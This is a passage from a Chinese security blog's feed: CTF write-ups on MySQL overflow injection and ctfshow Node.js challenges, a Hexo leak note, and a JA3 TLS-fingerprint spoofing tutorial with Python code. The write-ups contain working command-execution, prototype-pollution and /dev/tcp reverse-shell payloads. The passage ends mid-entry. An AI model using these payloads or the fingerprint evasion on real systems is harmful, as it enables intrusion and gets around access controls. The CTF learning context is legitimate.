<li><h4 id="最后的重点就是-9223372036854775807"><a href="#最后的重点就是-9223372036854775807" class="headerlink" title="最后的重点就是 9223372036854775807"></a>最后的重点就是 9223372036854775807</h4>  在mysql中，默认数字会视为<code>BIGINT</code>类型，也就是-9223372036854775808-9223372036854775807<br>  如果9223372036854775807+1就会溢出，然后报错。<br>  但是如果是9223372036854775808，他会默认把这个数字转换成<code>unsigned bigint</code>类型<br>  如下图<br>  <img src="/2022/09/28/%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bsql%E6%B3%A8%E5%85%A5/1.jpg" alt><br>  <img src="/2022/09/28/%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bsql%E6%B3%A8%E5%85%A5/2.jpg" alt><br>  那么如果直接设置9223372036854775808，他是不会报错的，因为会把他转化为<code>unsigned bigint</code>类型<br>  所以需要9223372036854775807+1，这样就超过bigint类型的最大范围<br>  当然也可以超过<code>unsigned bigint</code>，比如18446744073709551615+1，当然还有很多其它类型double类型之类的，都可以去溢出，原理相同，这种方法不会在语句中出现括号</li>
</ul>
<h2 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4.参考链接"></a>4.参考链接</h2><ul>
<li>case:<a href="https://dev.mysql.com/doc/refman/8.0/en/case.html">https://dev.mysql.com/doc/refman/8.0/en/case.html</a></li>
<li>utf8mb4_bin:<a href="https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-sets.html">https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-sets.html</a></li>
<li>collate:<a href="https://www.jb51.net/article/214738.htm">https://www.jb51.net/article/214738.htm</a></li>
</ul>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>实战|看我如何从url跳转到盗号</title>
    <url>/2022/10/13/%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E4%BB%8Eurl%E8%B7%B3%E8%BD%AC%E5%88%B0%E7%9B%97%E5%8F%B7/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">
  <script id="hbeData" type="hbeData" data-hmacdigest="0812e8fe096560142d950d298e99d24f600648f50a342a34b549c556f208099a"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>实战</tag>
        <tag>逻辑漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo 敏感文件泄漏</title>
    <url>/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/</url>
    <content><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在发上一篇文章的时候，因为涉及到敏感信息所以装了个插件<br><code>npm install --save hexo-blog-encrypt</code><br><span id="more"></span><br>给我的博文进行了加密访问<br>今天心血来潮，去我的github仓库看了一眼<br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/1.jpg" alt><br>好家伙，发现图片全在里面，也就代表着别人只要翻一下我的仓库就能知道到底是哪个网站存在那个漏洞了</p>
<h2 id="看看别人存不存在这个问题"><a href="#看看别人存不存在这个问题" class="headerlink" title="看看别人存不存在这个问题"></a>看看别人存不存在这个问题</h2><p>这时候我就想到y4大佬的博客也有一些加密文章<br>我就去翻了一下<br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/2.jpg" alt><br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/4.jpg" alt><br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/3.jpg" alt><br>看来大部分人都应该没有意识到这个问题，都是加密了文章，但是图片还是上传了上去<br>虽然泄漏的并不多，也就只有图片，但也算一个小漏洞吧</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>因为不想花钱去买服务器，所以最后我就把图片链接全部改为图床的链接，应该就能解决这个问题了，然后把之前的图片全部删除掉</p>
]]></content>
      <categories>
        <category>信息泄漏</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>实战</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>突破限制访问-修改ja3指纹</title>
    <url>/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>因为在t00ls上看到有人提问，代理了ip也无法突破限制访问<br><span id="more"></span><br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/1.jpg" alt><br>我就想到了可能是对方网站是识别了你的tls特征<br>那么就需要修改这些特征，去突破访问限制</p>
<h2 id="入门ja3指纹"><a href="#入门ja3指纹" class="headerlink" title="入门ja3指纹"></a>入门ja3指纹</h2><h3 id="TLS会话"><a href="#TLS会话" class="headerlink" title="TLS会话"></a>TLS会话</h3><p>因为ja3指纹是基于TLS协议的，所以要先简单了解一下这个协议<br>TLS是ssl的进阶版本，用于加密会话<br>当初始化一个TLS会话的时候，需要进行先进行最基本的三次握手<br>在三次握手后，客户端会向服务端发送一个Client Hello包，然后服务端向客户端发送Server Hello包，这里我们主要关注这个Client Hello包<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/2.jpg" alt></p>
<h3 id="Client-Hello包基本结构"><a href="#Client-Hello包基本结构" class="headerlink" title="Client Hello包基本结构"></a>Client Hello包基本结构</h3><p><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/3.jpg" alt></p>
<p><br><br>这里只需要关注几个字段就行了</p>
<p>version:TLS的版本,这里是0x0303<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/4.jpg" alt></p>
<p><br><br>Cipher Suites:列举出客户端支持的加密算法，每一种加密算法对应一个hex值<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/5.jpg" alt></p>
<p><br><br>一系列Extension，每个都有不同的含义，这里不需要关注具体用处，只要知道是用一个十六进制值去代表每一种extension的就可以了<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/6.jpg" alt></p>
<h3 id="ja3指纹计算"><a href="#ja3指纹计算" class="headerlink" title="ja3指纹计算"></a>ja3指纹计算</h3><p>ja3的计算主要就是由上面那几个字段的十进制组合在一起，然后计算他们的md5，格式如下：<br><strong>TLSVersion,Cipher Suites,Extensions Type,Supported Groups,Elliptic curves point formats</strong><br>当一个字段有不同的类型，就用 “-” 按照<strong>顺序</strong>依次去连接，这个顺序很重要一会儿会提到<br>例如我这里就是<br><strong>771,4866-4867-4865-157-49313-49309-156-49312-49308-61-60-53-47-163-159-52394-49315-49311-49239-49235-162-158-49314-49310-49238-49234-107-106-196-195-103-64-190-189-57-56-136-135-51-50-69-68-49196-49200-49327-49325-49188-49192-49162-49172-49233-49232-192-186-132-65-52393-52392-49245-49249-49195-49199-49326-49324-49244-49248-49267-49271-49187-49191-49266-49270-49161-49171-255,0-11-10-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2</strong><br>进行md5加密后就是ja3指纹了<br><strong>a6b4648af79cb0e6c9070f2fca7d5ac2</strong></p>
<p>下面我依次介绍每块第一个数字的由来</p>
<p>771就是0x0303的十进制<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/14.jpg" alt><br><br><br>4866就是，0x1302的十进制<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/8.jpg" alt><br><br><br>0就是Extension:Server Name的type<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/9.jpg" alt><br><br><br>29就是Extension Supported Groups中的Supported Groups第一个<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/10.jpg" alt><br><br><br>0就是Extension ec_point_formats中Elliptic curves point formats第一个<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/11.jpg" alt></p>
<p>在wireshark最下面也会有显示这个ja3，但是这个并不会真正的存在于数据包中，而是服务端提取到客户端的相应字段进行计算后得到的<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/7.jpg" alt></p>
<h2 id="伪造ja3指纹"><a href="#伪造ja3指纹" class="headerlink" title="伪造ja3指纹"></a>伪造ja3指纹</h2><h3 id="用不同代理去访问网站"><a href="#用不同代理去访问网站" class="headerlink" title="用不同代理去访问网站"></a>用不同代理去访问网站</h3><p>这个网站可以看到自己的ja3指纹 <a href="https://kawayiyi.com/tls">https://kawayiyi.com/tls</a><br>我这里是用pandavpn的全局模式<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/12.jpg" alt>可以看到我的ip是<strong>107.187.83.12</strong>，我的tlsHashMd5也就是ja3指纹是<strong>6e43eefeaec91453751b092058ec8dd2</strong><br>当我换一个ip去访问的时候<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/13.jpg" alt><br>可以看到我的ip虽然变成了<strong>139.64.165.246</strong>，但是tlsHashMd5（ja3指纹）仍然是<strong>6e43eefeaec91453751b092058ec8dd2</strong><br>所以有时候就算各种换代理也无法访问网站可能就是这个原因，被记录下了ja3指纹</p>
<h3 id="修改ja3指纹"><a href="#修改ja3指纹" class="headerlink" title="修改ja3指纹"></a>修改ja3指纹</h3><p>那么当我们去修改Client Hello里面的一些信息，就可以达到修改ja3指纹突破访问限制，下面我直接贴出修改代码<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.util.ssl_ <span class="keyword">import</span> create_urllib3_context</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line"></span><br><span class="line">ORIGIN_CIPHERS = (<span class="string">&#x27;ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:&#x27;</span></span><br><span class="line"><span class="string">&#x27;DH+HIGH:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+HIGH:RSA+3DES&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DESAdapter</span>(<span class="title class_ inherited__">HTTPAdapter</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        CIPHERS = ORIGIN_CIPHERS.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        random.shuffle(CIPHERS)</span><br><span class="line">        CIPHERS = <span class="string">&#x27;:&#x27;</span>.join(CIPHERS)</span><br><span class="line">        self.CIPHERS = CIPHERS + <span class="string">&#x27;:!aNULL:!eNULL:!MD5&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__init__(*args, **kwargs)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init_poolmanager</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        context = create_urllib3_context(ssl_version=<span class="number">2</span>,ciphers=self.CIPHERS)</span><br><span class="line">        kwargs[<span class="string">&#x27;ssl_context&#x27;</span>] = context</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>(DESAdapter, self).init_poolmanager(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># def proxy_manager_for(self, *args, **kwargs):</span></span><br><span class="line">    <span class="comment">#     context = create_urllib3_context(ssl_version=2,ciphers=self.CIPHERS)</span></span><br><span class="line">    <span class="comment">#     kwargs[&#x27;ssl_context&#x27;] = context</span></span><br><span class="line">    <span class="comment">#     super(DESAdapter, self).proxy_manager_for(*args, **kwargs)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SpoofJa3Get</span>(<span class="params">url,headers</span>):</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.headers.update(headers)</span><br><span class="line">    s.mount(url, DESAdapter())</span><br><span class="line">    resp = s.get(url)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    resp = SpoofJa3Get(<span class="string">&#x27;https://kawayiyi.com/tls&#x27;</span>,&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67&#x27;</span>&#125;)</span><br><span class="line">    data = resp.json()</span><br><span class="line">    <span class="built_in">print</span>(data[<span class="string">&#x27;tlsHashMd5&#x27;</span>])</span><br></pre></td></tr></table></figure></p>
<p>这个是运行效果，可以看到ja3指纹确实都改变了<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/15.jpg" alt></p>
<p>接下来简单讲解一下代码<br>这里主要是去继承原先的HTTPAdapter，在构造函数中将Cipher Suites进行打乱随机排序，然后去重写<code>init_poolmanager</code><br>可以看到官方文档介绍这个函数</p>
<blockquote>
<p>Initializes a urllib3 PoolManager.<br>&nbsp;&nbsp;&nbsp;This method should not be called<br>&nbsp;&nbsp;&nbsp;from user code, and is only exposed for use when subclassing the<br>&nbsp;&nbsp;&nbsp;:class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.<br>&nbsp;&nbsp;&nbsp;:param connections: The number of urllib3 connection pools to cache.<br>&nbsp;&nbsp;&nbsp;:param maxsize: The maximum number of connections to save in the pool.<br>&nbsp;&nbsp;&nbsp;:param block: Block when no free connections are available.</requests.adapters.HTTPAdapter></p>
</blockquote>
<p>只有短短的一句，根据名称猜测就是初始化一个连接池之类的，然后每次访问别的网站都要基于这个连接池去访问，类似与urllib3的PoolManager</p>
<p>create_urllib3_context 官方文档介绍我就不贴出来了，具体可以看<br><a href="https://github.com/urllib3/urllib3/blob/main/src/urllib3/util/ssl_.py#L221">https://github.com/urllib3/urllib3/blob/main/src/urllib3/util/ssl_.py#L221</a><br>简单说一下就是创建并且配置一个ssl内容的实例，并且返回这个实例，但是给出的参数与ja3指纹相关的只有</p>
<ul>
<li>ssl version</li>
<li>cipher suites</li>
</ul>
<p>ssl版本我们不能随便修改，不然就会出错，能修改的只有支持的加密算法<br>后面的代码我就不做过多解释了，应该都是很简单的</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>至于怎么去修改Extensions Type,Supported Groups,Elliptic curves point formats来进行修改ja3指纹，我就不太清楚了<br>之前在stackoverflow上面问了一个跟我有同样疑惑的网友，问他现在解决没有，但是评论不知道为什么被系统秒删了，我也就没去进行深究了<br><a href="https://stackoverflow.com/questions/69982651/tls-adapter-for-extentions-with-python3-requests/74032540#74032540">https://stackoverflow.com/questions/69982651/tls-adapter-for-extentions-with-python3-requests/74032540#74032540</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967/">https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967/</a></li>
<li><a href="https://www.cnblogs.com/theseventhson/p/14613527.html">https://www.cnblogs.com/theseventhson/p/14613527.html</a></li>
<li><a href="https://stackoverflow.com/questions/40373115/how-to-select-specific-the-cipher-while-sending-request-via-python-request-modul">https://stackoverflow.com/questions/40373115/how-to-select-specific-the-cipher-while-sending-request-via-python-request-modul</a></li>
<li><a href="https://urllib3.readthedocs.io/en/stable/reference/urllib3.poolmanager.html">https://urllib3.readthedocs.io/en/stable/reference/urllib3.poolmanager.html</a></li>
</ul>
]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-nodejs</title>
    <url>/2022/11/28/ctfshow-nodejs/</url>
    <content><![CDATA[<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">constructor.prototype==__proto__</span><br></pre></td></tr></table></figure>
<h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><span id="more"></span>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>看到前面<br><code>name!==&#39;CTFSHOW&#39;</code><br>后面<br><code>item.username === name.toUpperCase</code><br>那么直接输入小写ctfshow和123456即可绕过</p>
<blockquote>
<p>在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。<br>在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。</p>
</blockquote>
<h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><p>查看源码，知道参数/?eval=<br>传入参数<br><code>eval=require(&#39;child_process&#39;).exec(&#39;id&#39;);</code><br><img src="/2022/11/28/ctfshow-nodejs/1.jpg" alt><br>可以看到是object Object 无回显<br>因为exec返回的是 ChildProcess<br><a href="http://nodejs.cn/api/child_process.html">http://nodejs.cn/api/child_process.html</a><br>查看文档可以替换成如下函数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">命令执行</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>,[<span class="string">&#x27;fl00g.txt&#x27;</span>]).<span class="property">output</span>;</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>,[<span class="string">&#x27;fl00g.txt&#x27;</span>]).<span class="property">stdout</span>;</span><br><span class="line">?<span class="built_in">eval</span>=<span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">文件操作</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readdirSync</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;fl001g.txt&#x27;</span>);</span><br></pre></td></tr></table></figure></p>
<h2 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h2><p>传入<br><code>require(&#39;child_process&#39;).execSync(&#39;ls /&#39;).toString()</code><br><code>require(&#39;child_process&#39;).exec(&#39;ls /&#39;)</code><br>均回显tql，盲猜过滤了exec<br>使用<br><code>require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;,[]).output;</code><br><code>require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl001g.txt&#39;]).output;</code><br>或者web335的读文件操作</p>
<h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>类似于php的传输入<br>payload: <code>/?a[x]=1&amp;b[x]=1</code></p>
<h2 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h2><p>原型链污染：<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript</a><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>看到copy这个函数的实现，可以想到原型链污染<br>根据app.js的路由，知道是routes/login.js这个文件<br>那么只需要抓取登录包，把post内容改为<br><code>&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code><br>即可获取flag</p>
<h2 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h2><blockquote>
<p>在做之前调试了一下nodejs，发现原型链污染完以后，在下次那个被污染的还是被污染，并不会在下次访问的时候就变成未被污染的状态</p>
</blockquote>
<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>只要把query进行变量覆盖，就可以进行任意命令执行</p>
<blockquote>
<p><strong>注意这里是大写Function，是一个构造器，可以把这里分解为两步看</strong><br><img src="/2022/11/28/ctfshow-nodejs/2.jpg" alt></p>
</blockquote>
<p>用如下payload访问login页面<br><code>&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/2334 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code><br>成功将query进行覆盖，再去访问api那个页面，就会反弹shell</p>
<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>主要是一个ejsRCE，参考链接：<a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/</a><br><code>&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/2334 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p>
<h2 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">utils.<span class="title function_">copy</span>(user.<span 